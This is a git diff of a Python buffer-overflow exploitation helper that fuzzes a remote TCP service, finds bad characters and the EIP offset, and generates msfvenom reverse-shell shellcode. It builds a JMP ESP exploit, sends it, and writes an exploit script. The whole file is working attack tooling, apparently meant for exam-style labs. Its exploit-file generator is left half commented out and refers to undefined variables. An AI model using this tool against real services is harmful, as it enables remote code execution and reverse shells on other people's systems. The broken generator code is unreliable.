@@ -1,9 +1,9 @@
 #!/usr/bin/python
-import binascii
-import re
 import socket
-import subprocess
-import time
+from binascii import unhexlify
+from re import search
+from struct import pack
+from subprocess import run
 
 from pwn import asm
 
@@ -14,8 +14,8 @@ BOFErrorConnectionRefused = -2
 BOFErrorConnectionReset = -3
 BOFErrorConnectionTimeout = -4
 BOFErrorServiceAlive = -5
-BOFErrorNoSpace = -7
-BOFErrorInvalid = -8
+BOFErrorNoSpace = -6
+BOFErrorInvalid = -7
 
 BOFAllHex = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0a', '0b', '0c', '0d', '0e', '0f', '10', '11',
              '12', '13', '14', '15', '16', '17', '18', '19', '1a', '1b', '1c', '1d', '1e', '1f', '20', '21', '22',
@@ -42,11 +42,11 @@ def live_option_long(option: str) -> bytes:
 
 
 def execute(cmd: str) -> bytes:
-    return subprocess.run(cmd, shell=True, capture_output=True).stdout
+    return run(cmd, shell=True, capture_output=True).stdout
 
 
 def is_hex(integer: str) -> bool:
-    return len(integer) == 2 and not re.search(r"[^a-f0-9]", integer)
+    return len(integer) == 2 and not search(r"[^a-f0-9]", integer)
 
 
 def is_register(reg: str) -> bool:
@@ -67,7 +67,7 @@ class BOFHelper:
         self._interface = interface
         self._lPort = local_port
         self._lIP = execute("ip addr show %s | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1" % self._interface) \
-            .decode()
+            .decode().strip()
         self._ip = ip
         self._port = port
         self._header = header
@@ -91,6 +91,8 @@ class BOFHelper:
         self._badCharsFound = False
         self._shellCode = b""
         self._shellCodeGenerated = False
+        self._espPadding = 0
+        self._espPaddingSet = False
         self._firstStage = b""
         self._stackSpace = 0
         self._shellCodeInESP = True
@@ -102,11 +104,11 @@ class BOFHelper:
 
     def _input(self, text: str, debug: bool = False) -> str:
         if (not debug) or (debug and self._debug):
-            return input(str(text))
+            return input("(*) " + text).strip()
 
     def __log(self, text: str, debug: bool = False) -> None:
         if (not debug) or (debug and self._debug):
-            print(str(text))
+            print(text)
 
     def _func_log(self, text: str, debug: bool = False) -> None:
         self.__log("[-] " + text, debug)
@@ -151,7 +153,7 @@ class BOFHelper:
     # @param trial  Records the number of time this request has been resent. Set to 5 to disable
     #               resending in case of socket timeout.
 
-    def send_data(self, buffer: bytes, trial: int = 3) -> int:
+    def send_data(self, buffer: bytes, trial: int = 3, recv: bool = True) -> int:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(self._timeout)
         try:
@@ -161,8 +163,10 @@ class BOFHelper:
                 self._liveOptions[payload_len] = str(len(buffer) + len(self._prefix) + len(self._suffix)).encode()
             self._process_header()
             s.send(self._header + self._prefix + buffer + self._suffix)
-            res = s.recv(1024).decode()
-            self._debug_log(res)
+            if recv:
+                res = s.recv(1024).decode()
+                self._debug_log(res)
+                s.close()
 
         except ConnectionRefusedError:
             self._err_log("Could not connect to %s at port %s!" % (self._ip, self._port))
@@ -177,8 +181,6 @@ class BOFHelper:
             self._warn_log("Remember to start the service!")
             return BOFErrorConnectionTimeout
 
-        s.close()
-        time.sleep(1)
         return BOFErrorSuccess
 
     # @function _get_byte_for_overflow
@@ -282,9 +284,17 @@ class BOFHelper:
         self._eipOffset = offset
         self._eipObtained = True
 
+    def get_esp_padding(self) -> None:
+        self._espPadding = int(self._input("How many bytes are between EIP and ESP: "))
+        self._espPaddingSet = True
+
+    def set_esp_padding(self, padding: int) -> None:
+        self._espPadding = padding
+        self._espPaddingSet = True
+
     def __check_input(self) -> None:
         ans = self._input("Enter bad characters found (separate with space): ") \
-            .strip().lower().replace("\\x", "").replace("0x", "")
+            .lower().replace("\\x", "").replace("0x", "")
         if ans == "":
             self._success_log("Empty input, assuming that all bad characters have been found!")
             return
@@ -305,7 +315,7 @@ class BOFHelper:
                 if is_hex(item):
                     new_chars.append(item)
         self._prompt_log("Processed dump: %s" % " ".join(new_chars))
-        if self._input("Proceed? (y/n)\n").strip().lower() != 'y':
+        if self._input("Proceed? (y/n)\n").lower() != 'y':
             self._err_log("Dump malformed! Try again!")
             return self.__check_dump(chars)
 
@@ -331,7 +341,7 @@ class BOFHelper:
 
     def __send_chars(self, chars: list[str], manual: bool = False) -> int:
         offset_len = self._eipOffset - len(chars)
-        error = self.send_data(b"A" * (offset_len // 2) + binascii.unhexlify("".join(chars))
+        error = self.send_data(b"A" * (offset_len // 2) + unhexlify("".join(chars))
                                + b"A" * (offset_len - (offset_len // 2)) + b"B" * 1, 5)
 
         # Connection refused. Bye!
@@ -345,6 +355,7 @@ class BOFHelper:
 
         self._success_log("Characters sent!")
         self._debug_log("Look at the region in between the A's!")
+        self.get_esp_padding()
         if manual:
             self.__check_input()
             return BOFErrorSuccess
@@ -356,7 +367,7 @@ class BOFHelper:
     def __send_chars_auto(self, chars: list[str]) -> int:
         self._debug_log("Sending: %s" % " ".join(chars))
         offset_len = self._eipOffset - len(chars)
-        error = self.send_data(b"A" * (offset_len // 2) + binascii.unhexlify("".join(chars))
+        error = self.send_data(b"A" * (offset_len // 2) + unhexlify("".join(chars))
                                + b"A" * (offset_len - (offset_len // 2)) + b"B" * 1, 5)
 
         # Connection refused. Bye!
@@ -444,6 +455,7 @@ class BOFHelper:
                 bad_chars.remove(item)
         self._badChars.extend(bad_chars)
         self._badChars = list(set(self._badChars))
+        self._badChars.sort()
         self._badCharsFound = True
 
     # @function generate_shellcode
@@ -466,28 +478,29 @@ class BOFHelper:
             return BOFErrorInvalid
 
         # Add NOP slides
-        self._shellCode += b"\x90" * int(self._input("Number of NOP slides: ").strip())
+        self._shellCode += b"\x90" * int(self._input("Number of NOP slides: "))
         self._step_log("Generating list of all payloads...")
         all_payloads = execute("msfvenom --list payload").decode()
         while True:
-            ans = self._input("Please enter the name of the payload to employ: ").strip().lower()
+            ans = self._input("Please enter the name of the payload to employ: ").lower()
             if ans in all_payloads:
                 break
             self._warn_log("Payload name does not exist. Printing help page...")
             print(all_payloads)
 
-        if not self._lIP.strip():
+        if not self._lIP:
             self._warn_log("Failed to get local IP.")
             try:
-                ip = self._input("Local IP: ").strip()
+                ip = self._input("Local IP: ")
                 socket.inet_aton(ip)
             except socket.error:
                 self._err_log("IP address invalid!")
                 return BOFErrorFailure
             self._lIP = ip
 
-        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%s EXITFUNC=thread –e x86/shikata_ga_nai -b\"\\x%s\""
-                                   "-f raw" % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
+        payload = execute("msfvenom -p %s LHOST=%s LPORT=%d EXITFUNC=thread -f raw –e x86/shikata_ga_nai -b \"\\x%s\""
+                          % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
+        self._shellCode += payload
         self._shellCodeGenerated = True
         return BOFErrorSuccess
 
@@ -496,7 +509,7 @@ class BOFHelper:
             return True
 
         self._prompt_debugger()
-        error = self.send_data(b"A" * self._eipOffset + b"B" * 4 + b"C" * space, 5)
+        error = self.send_data(b"A" * self._eipOffset + b"B" * 4 + b"C" * self._espPadding + b"D" * space, 5)
 
         # Connection refused. Bye!
         if error == BOFErrorConnectionRefused:
@@ -508,7 +521,7 @@ class BOFHelper:
             return False
 
         # User validation required
-        ans = self._input("Payload sent. Check to see if EIP is filled with 42424242. (y/n)\n").strip().lower()
+        ans = self._input("Payload sent. Check to see if EIP is filled with 42424242. (y/n)\n").lower()
 
         # Success! Update stack space.
         if ans == 'y':
@@ -538,7 +551,7 @@ class BOFHelper:
             return BOFErrorNoSpace
 
         # Generate first stage shellcode
-        register = self._input("Please enter the register that records your payload: ").strip()
+        register = self._input("Please enter the register that records your payload: ")
         if is_register(register):
             self._firstStage = str(asm("add %s, %d; jmp %s" % (register, len(self._prefix), register)))
             if not self._check_space(len(self._firstStage)):
@@ -546,7 +559,7 @@ class BOFHelper:
                 return BOFErrorNoSpace
         else:
             # TO-DO: EGG HUNTER
-            pass
+            return BOFErrorInvalid
 
         # We have the entire filler space at our disposal
         self._stackSpace = self._eipOffset
@@ -570,8 +583,15 @@ class BOFHelper:
     def expand_space(self) -> int:
         self._func_log("Expanding space...")
 
+        if self._spaceExpanded:
+            return BOFErrorSuccess
+
         if not self._shellCodeGenerated:
             self._err_log("Please first generate the shellcode!")
+            return BOFErrorInvalid
+
+        if not self._espPaddingSet:
+            self._err_log("Please manually set the ESP padding!")
             return BOFErrorInvalid
 
         if self._check_space(len(self._shellCode)):
@@ -594,16 +614,18 @@ class BOFHelper:
             self._err_log("Please first expand space for shellcode!")
             return BOFErrorInvalid
 
-        ans = self._input("Enter address to overwrite EIP with: ").strip().lower().replace("\\x", "").replace("0x", "")
-        if re.search(r"[^a-f0-9]", ans):
+        # Find return address (JMP ESP)
+        self._prompt_log("Tip: !mona find -s \"\\xff\\xe4\"")
+        ans = self._input("Enter address to overwrite EIP with: ").lower().replace("\\x", "").replace("0x", "")
+        if search(r"[^a-f0-9]", ans):
             self._err_log("Address invalid!")
             return BOFErrorInvalid
-        self._eip = binascii.unhexlify(ans)
+        self._eip = pack("<I", int(ans, 16))
         if self._shellCodeInESP:
-            self._exploit = b"A" * self._eipOffset + self._eip + self._shellCode
+            self._exploit = b"A" * self._eipOffset + self._eip + b"B" * self._espPadding + self._shellCode
         else:
-            self._exploit = b"A" * (self._eipOffset - len(self._shellCode)) + self._shellCode + self._eip \
-                            + self._firstStage
+            self._exploit = b"A" * (self._eipOffset - len(self._shellCode)) + self._shellCode + self._eip + \
+                            b"B" * self._espPadding + self._firstStage
 
         self._success_log("Exploit built successfully!", True)
         return BOFErrorSuccess
@@ -615,13 +637,13 @@ class BOFHelper:
     def send_exploit(self) -> int:
         self._func_log("Exploiting...")
 
-        if not self._exploit.strip():
+        if not self._exploit:
             if self._build_exploit():
                 return BOFErrorFailure
 
-        self._prompt_log("Remember to open up a listener if you are using shellcode to gain a reverse shell!")
+        self._prompt_log("Remember to open up a listener if you are using the shellcode to gain a reverse shell!")
         input()
-        if self.send_data(self._exploit) != BOFErrorConnectionReset:
+        if self.send_data(self._exploit, 5, False) != BOFErrorSuccess:
             self._err_log("Exploit failed. Try sending the payload manually.")
             return BOFErrorFailure
 
@@ -635,18 +657,26 @@ class BOFHelper:
     def generate_file(self) -> int:
         self._func_log("Generating exploit.py...")
 
-        if not self._exploit.strip():
+        if not self._exploit:
             if self._build_exploit():
                 return BOFErrorFailure
 
         output = "#!/usr/bin/python\n" \
                  "import socket\n\n" \
-                 "buf = %s\n" \
-                 "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
-                 "s.connect((\"%s\", %s))\n" \
-                 "s.send(exploit)\n" \
-                 "s.recv(1024)\n" \
-                 "s.close()" % (self._exploit.decode(), self._ip, self._port)
+                 "try:" \
+                 "  filler = b\"A\" * %d\n" \
+                 "  eip = %s\n" \
+                 "  offset = b\"B\" * %d\n" \
+                 "  shellcode = %s\n" % (self._eipOffset, self._eip, self._espPadding, self._shellCode.decode())
+
+        # "  payload = %s + filler + eip + offset + shellcode + %s\n\n" \
+        # "  buffer = %s\n" \
+        # "  buffer += payload \n\n" \
+        # "  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
+        # "  s.connect((\"%s\", %s))\n" \
+        # "  s.send(exploit)\n" \
+        # "  s.recv(1024)\n" \
+        # "  s.close()" % (self._eipOffset, self._ip, self._port)
 
         with open("/tmp/exploit.py", "w") as file:
             file.write(output)
